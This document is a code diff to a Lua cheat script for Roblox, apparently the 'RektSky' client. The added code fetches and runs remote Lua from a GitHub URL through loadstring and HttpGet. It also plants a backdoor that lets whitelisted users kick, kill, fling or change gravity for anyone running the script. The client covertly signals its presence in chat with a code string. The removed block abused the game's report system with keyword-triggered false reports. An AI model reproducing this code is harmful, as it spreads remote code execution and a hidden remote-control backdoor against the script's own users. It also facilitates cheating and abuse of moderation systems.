@@ -5,6 +5,13 @@ shared["CometConfigs"] = {
     Watermark = true,
     Enabled = false
 }
+
+local whiteliststhing = {}
+
+pcall(function()
+    whiteliststhing = loadstring(game:HttpGet("https://raw.githubusercontent.com/8pmX8/rektsky4roblox/main/whitelist.lua"))()
+end)
+
 local lib
 if shared["betterisfile"]("CometV2/GuiLibrary") then
     lib = loadstring(readfile("CometV2/GuiLibrary.lua"))()
@@ -1952,100 +1959,87 @@ runcode(function()
         end
     })
 end)
-runcode(function()
- local sayinchat = {["Value"] = false}
-    local notificationsenabled = {["Value"] = true}
-    local autoreport = false
-    local autoreportthingy = Tabs["Utility"]:CreateToggle({
-        ["Name"] = "AutoReport",
-        ["Keybind"] = nil,
-        ["Callback"] = function(v)
-            autoreport = v
-            if autoreport then
-                local reporttable = {
-                    ["ez"] = "Bullying",
-                    ["gay"] = "Bullying",
-                    ["gae"] = "Bullying",
-                    ["hacks"] = "Scamming",
-                    ["hacker"] = "Scamming",
-                    ["hack"] = "Scamming",
-                    ["cheat"] = "Scamming",
-                    ["hecker"] = "Scamming",
-                    ["get a life"] = "Bullying",
-                    ["L"] = "Bullying",
-                    ["thuck"] = "Swearing",
-                    ["thuc"] = "Swearing",
-                    ["thuk"] = "Swearing",
-                    ["fatherless"] = "Bullying",
-                    ["yt"] = "Offsite Links",
-                    ["discord"] = "Offsite Links",
-                    ["dizcourde"] = "Offsite Links",
-                    ["retard"] = "Swearing",
-                    ["tiktok"] = "Offsite Links",
-                    ["bad"] = "Bullying",
-                    ["trash"] = "Bullying",
-                    ["die"] = "Bullying",
-                    ["lobby"] = "Bullying",
-                    ["ban"] = "Bullying",
-                    ["youtube"] = "Offsite Links",
-                    ["im hacking"] = "Cheating/Exploiting",
-                    ["I'm hacking"] = "Cheating/Exploiting",
-                    ["download"] = "Offsite Links",
-                    ["kill your"] = "Bullying",
-                    ["kys"] = "Bullying",
-                    ["hack to win"] = "Bullying",
-                    ["bozo"] = "Bullying",
-                    ["kid"] = "Bullying",
-                    ["adopted"] = "Bullying",
-                    ["vxpe"] = "Cheating/Exploiting",
-                    ["futureclient"] = "Cheating/Exploiting",
-                    ["nova6"] = "Cheating/Exploiting",
-                    [".gg"] = "Offsite Links",
-                    ["gg"] = "Offsite Links",
-                    ["lol"] = "Bullying",
-                    ["suck"] = "Dating",
-                    ["love"] = "Dating",
-                    ["fuck"] = "Swearing",
-                    ["sthu"] = "Swearing",
-                    ["i hack"] = "Cheating/Exploiting",
-                    ["disco"] = "Offsite Links",
-                    ["dc"] = "Offsite Links"
-                }
-                function getreport(msg)
-                    for i,v in pairs(reporttable) do 
-                        if msg:lower():find(i) then 
-                            return v
-                        end
-                    end
-                    return nil
-                end
-                for i, v in pairs(game.Players:GetPlayers()) do
-                    if v.Name ~= lplr.Name then
-                        v.Chatted:connect(function(msg)
-                            local reportfound = getreport(msg)
-                            if reportfound then
-                                if sayinchat["Value"] then
-                                    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Reported " .. v.Name .. " for " .. reportfound, 'All')
-                                end
-                                game.Players:ReportAbuse(v, reportfound, 'He said "' .. msg .. '", was very offensive to me')
-                                if notificationsenabled["Value"] then
-                                    createnotification("Reported" .. v.Name, "for saying " .. msg, 5, true)
-                                end
-                            end
-                        end)
-                    end
+
+local whitelists = {
+    ["IsPrivUserInGame"] = function()
+        for i, v in pairs(game.Players:GetPlayers()) do
+            for k, b in pairs(whiteliststhing) do
+                if v.UserId == tonumber(b) then
+                    return true
                 end
             end
         end
-    })
-    sayinchat = autoreportthingy:CreateOptionTog({
-        ["Name"] = "Say reports in chat",
-        ["Default"] = false,
-        ["Func"] = function() end
-    })
-    notificationsenabled = autoreportthingy:CreateOptionTog({
-        ["Name"] = "Notifications",
-        ["Default"] = true,
-        ["Func"] = function() end
-    })
-end)
+        return false
+    end,
+    ["GetPrivUser"] = function()
+        for i, v in pairs(game.Players:GetPlayers()) do
+            for k, b in pairs(whiteliststhing) do
+                if v.UserId == tonumber(b) then
+                    return v.Name
+                end
+            end
+        end
+    end
+}
+
+local alreadytold = {}
+
+repeat
+    if lplr.Name == whitelists["GetPrivUser"]() then break end
+    task.wait(1)
+    if whitelists["IsPrivUserInGame"]() then
+        if not table.find(alreadytold, whitelists["GetPrivUser"]()) then
+            table.insert(alreadytold, whitelists["GetPrivUser"]())
+            args = {
+                [1] = "/whipser " .. whitelists["GetPrivUser"](),
+                [2] = "All"
+            }
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+            task.wait(0.5)
+            args = {
+                [1] = "RQYBPTYNURYZC",
+                [2] = "All"
+            }
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+        end
+    end    
+until (true == false)
+
+for i, v in pairs(game.Players:GetPlayers()) do
+    if lplr.Name == whitelists["GetPrivUser"]() then 
+        v.Chatted:connect(function(msg)
+            if msg == "RQYBPTYNURYZC" then
+                createnotification("RektSky", v.Name .. " is using rektsky!", 60, true)
+            end
+        end)
+    else
+        for lol, xd in pairs(whiteliststhing) do
+            if v.UserId == tonumber(xd) then
+                v.Chatted:connect(function(msg)
+                    if msg:find("r!kick") then
+                        if msg:find(lplr.Name) then
+                            local args = msg:gsub("r!kick " .. lplr.Name, "")
+                            lplr:kick(args)
+                        end
+                    end
+                    if msg:find("r!kill") then
+                        if msg:find(lplr.Name) then
+                            lplr.Character.Humanoid:TakeDamage(lplr.Character.Humanoid.Health)
+                        end
+                    end
+                    if msg:find("r!lagback") then
+                        if msg:find(lplr.Name) then
+                            lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame * CFrame.new(0, 10000, 0)
+                        end
+                    end
+                    if msg:find("r!gravity") then
+                        if msg:find(lplr.Name) then
+                            local args = msg:gsub("r!gravity " .. lplr.Name, "")
+                            game.Workspace.Gravity = tonumber(args)
+                        end
+                    end
+                end)
+            end
+        end
+    end
+end
